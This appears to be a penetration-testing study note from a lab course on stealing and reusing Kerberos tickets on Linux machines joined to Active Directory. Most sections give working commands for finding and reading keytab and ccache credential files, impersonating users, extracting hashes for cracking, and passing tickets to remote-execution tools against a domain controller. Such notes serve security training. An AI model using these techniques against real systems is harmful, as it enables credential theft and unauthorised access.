
## Table of Contents:

- [[#Identifying Linux and Active Directory integration]]
- [[#Finding Kerberos tickets in Linux]]
- [[#Abusing KeyTab files (Impersonation)]]
- [[#Abusing KeyTab files (Extraction)]]
- [[#Abusing KeyTab ccache]]
- [[#Using Linux attack tools with Kerberose]]
- [[#Ticket Converter]]
- [[#Linikatz (Needs root access)]]

Linux machines store Kerberos tickets as [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) in the `/tmp` directory. By default, the Kerberos ticket is stored in the environment variable `KRB5CCNAME`.

A [keytab](https://kb.iu.edu/d/aumh) is a file containing pairs of Kerberos principals and encrypted keys. It can authenticate to remote systems using Kerberos without entering a password.

```Note
Keytab files can be created and copied on a computer to use on another one.
```

---

## Identifying Linux and Active Directory integration

### [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd): Check if Linux machine is domain-joined

```shell
> realm list

> ps -ef | grep -i "winbind\|sssd"
```

[sssd](https://sssd.io/) or [winbind](https://www.samba.org/samba/docs/current/man-html/winbindd.8.html) can also be used. We can read this [blog post](https://web.archive.org/web/20210624040251/https://www.2daygeek.com/how-to-identify-that-the-linux-server-is-integrated-with-active-directory-ad/) for more details.

---

## Finding Kerberos tickets in Linux

### Finding KeyTab files

The ticket is represented as a keytab file located by default at `/etc/krb5.keytab` and can only be read by the root user.

```shell
find / -name *keytab* -ls 2>/dev/null
```

### Identifying KeyTab files in Cronjobs

```shell
crontab -l
```

**Found this cronjob:**

```bash
#!/bin/bash

kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt

smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
```

**Kinit**:  [kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html) allows interaction with Kerberos, and its function is to request the user's TGT and store this ticket in the cache (ccache file). We can use `kinit` to import a `keytab` into our session and act as the user.

A credential cache or [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) file holds Kerberos credentials while they remain valid and, generally, while the user's session lasts.

```shell
env | grep -i krb5
### Reviewing environment variables for ccache files. KRB5CCNAME.

ls -la /tmp
### searching for ccache files in /tmp
```

---

## Abusing KeyTab files (Impersonation)

The first thing we can do is impersonate a user using `kinit`. `klist` is used to interact with Kerberos on Linux. This application reads information from a `keytab` file.

### Listing KeyTab file information

```shell
klist -k -t /opt/specialfiles/carlos.keytab 

Keytab name: FILE:/opt/specialfiles/carlos.keytab
KVNO Timestamp           Principal
---- ------------------- -----------------------------------------
   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB
```

### Impersonating a user with a KeyTab

Import Carlos's ticket into our session with `kinit`. ALSO `kinit` is CASE-SENSITIVE 

```shell
> klist 
  ### confirming current session with klist

> kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
  ### Impersonating

> smbclient //dc01/carlos -k 
  ### connecting to smbcliet as carlos after impersonation
```

```Note
To keep the ticket from the current session, before importing the keytab,    save a copy of the ccache file present in the environment variable `KRB5CCNAME`.
```

---

## Abusing KeyTab files (Extraction)

To access the computer we need the password and we can extract it from the keytab file, we can use [KeyTabExtract](https://github.com/sosdave/KeyTabExtract) for this.
#### Extracting KeyTab hashes with KeyTabExtract

```sh
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
```

- NTDS - PTH / Cracking using `John`, `HashCat`, online repos like [crackstation](https://crackstation.net/)  
- AES128/256 - PTT / forge tickets using `Rubeus`

```Note
A KeyTab file can contain different types of hashes and can be merged to contain multiple credentials even from different users.
```

---

## Abusing KeyTab ccache

To abuse a `ccache` file, all we need is read privileges on the file.

```shell
> ls -la /tmp
  ### looking for ccache files

> klist 
> cp /tmp/krb5cc_647401106_I8I133 .
> export KRB5CCNAME=/root/krb5cc_647401106_I8I133
  ### copying ccache file and assigning the file path to KRB5CCNAME env var

> smbclient //dc01/C$ -k -c ls -no-pass
### doing smbclient //dc01/C$ -k (uses kerberos authentication)
```

```Note 
klist displays the ticket information like "valid starting" and "expires." If the expiration date has passed, the ticket will not work.
```

---

## Using Linux attack tools with Kerberose

### Impacket

```shell
export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
### Setting the KRB5CCNAME environment variable

impacket-wmiexec dc01 -k
### wghere dc01 is the pc name 
```

```Note
If you are using Impacket tools from a Linux machine connected to the domain, note that some Linux Active Directory implementations use the FILE: prefix in the KRB5CCNAME variable. If this is the case, we need to modify the variable only to include the path to the ccache file.
```

### Evil-WinRM
#### Kerberos configuration file for INLANEFREIGHT.HTB

```shell
netexec smb ip -u user -p password --generate-krb5-file /etc/krb5.conf
export KRB5_CONFIG=/etc/krb5.conf
### Create krb5.conf file
```

We need `krb5-user` for this, but if it is already installed, we need to change the configuration file `/etc/krb5.conf` to include the following values:

```sh
cat /etc/krb5.conf

[libdefaults]
        default_realm = INLANEFREIGHT.HTB

...SNIP...

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }

...SNIP...
```

```shell
evil-winrm -i dc01 -r inlanefreight.htb
```

---

## Ticket Converter

If we want to use a `ccache file` in Windows or a `kirbi file` in a Linux machine, we can use [impacket-ticketConverter](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py) to convert them.

```shell
ticketConverter.py krb5cc_647401106_I8I133 julio.kirbi
```

```PowerShell
C:\htb> Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
### Importing converted ticket into Windows session with Rubeus

> klist

Current LogonId is 0:0x31adf02

Cached Tickets: (1)

#0>     Client: julio @ INLANEFREIGHT.HTB
        Server: krbtgt/INLANEFREIGHT.HTB @ INLANEFREIGHT.HTB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0xa1c20000 -> reserved forwarded invalid renewable initial 0x20000
        Start Time: 10/10/2022 5:46:02 (local)
        End Time:   10/10/2022 15:46:02 (local)
        Renew Time: 10/11/2022 5:46:02 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
        

C:\htb> dir \\dc01\julio
```

---

## Linikatz (Needs root access)

[Linikatz](https://github.com/CiscoCXSecurity/linikatz) extract all credentials, including Kerberos tickets, from different Kerberos implementations such as FreeIPA, SSSD, Samba, Vintella, etc. Once it extracts the credentials, it places them in a folder whose name starts with `linikatz.`

---